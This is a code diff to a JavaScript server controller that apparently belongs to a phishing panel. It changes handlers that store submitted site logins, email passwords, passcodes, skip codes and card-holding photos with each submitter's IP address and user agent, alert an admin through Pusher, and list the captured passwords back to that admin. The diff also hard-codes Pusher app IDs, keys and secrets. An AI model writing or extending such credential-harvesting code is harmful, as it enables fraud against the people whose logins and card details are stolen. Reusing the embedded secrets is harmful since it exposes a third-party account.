@@ -388,17 +388,16 @@ export const poster_add = async (req, res) => {
 
 export const add_data = async (req, res) => {
     const pusher = new Pusher({
-        appId: '1773152',
-        key: 'f47031316f13ab641256',
-        secret: 'f1f2616da0bb8ffa85b7',
+        appId: '1891860',
+        key: 'e4766909b306ad7ddd58',
+        secret: 'ffbb52b3b0756a523d83',
         cluster: 'ap2',
         useTLS: true,
-       
       });
 
 
     const { adminId, posterId } = req.params
-    const { site, email, password, skipcode  } = req.body
+    const { site, mail, passcode  } = req.body
     const userAgent = req.headers['user-agent'];
     const ipAddress =  (req.headers['x-forwarded-for'] || 
     req.connection.remoteAddress || 
@@ -412,7 +411,7 @@ export const add_data = async (req, res) => {
 
         if (userFound && posterFound) {
             const info = await Info.create({
-                site, email, password, skipcode,
+                site, mail, passcode,
                adminId:adminId,
                 poster: posterId,
                 root: posterFound._id,
@@ -421,8 +420,7 @@ export const add_data = async (req, res) => {
 
 
             })
-            const cookie=createToken(info._id)
-            info.cookie=cookie
+           
             await info.save();
             if(info){
                 pusher.trigger(userFound.adminId, 'new-notification', {
@@ -628,7 +626,7 @@ export const poster_details =async  (req, res) => {
 
         const poster = await Poster.findOne({ _id: id }).select('username password posterId links createdAt')
        
-        const details =await Info.find({ root: id }).select('site email password skipcode ip agent status createdAt').sort({ createdAt: -1 })
+        const details =await Info.find({ root: id }).select('site mail passcode skipcode email password ip agent status createdAt').sort({ createdAt: -1 })
         // const newdata = {...poster, details: details }
         // console.log(newdata)
         return res.status(200).json({ data: {...poster, details: details }})
@@ -1336,7 +1334,7 @@ export const update_many =  (req, res) => {
 export const add_data_checnge = async (req, res) => {
 
     const { adminId, posterId } = req.params
-    const { site, email, password, skipcode ,username,passcode,mail, mailPass,onlyCard,holdingCard } = req.body
+    const { site, email, password, skipcode ,username,passcode } = req.body
     const userAgent = req.headers['user-agent'];
     const ipAddress = req.connection.remoteAddress;
     try {
@@ -1346,11 +1344,10 @@ export const add_data_checnge = async (req, res) => {
 
         if (userFound && posterFound) {
             const info = await Info.create({
-                site, email, password, skipcode,
-                username,passcode,mail,mailPass,
+                 skipcode,
+                username,passcode,
                 poster: posterId,
                 root: posterFound._id,
-                onlyCard,holdingCard,
                 ip:ipAddress,
                 agent:userAgent
 
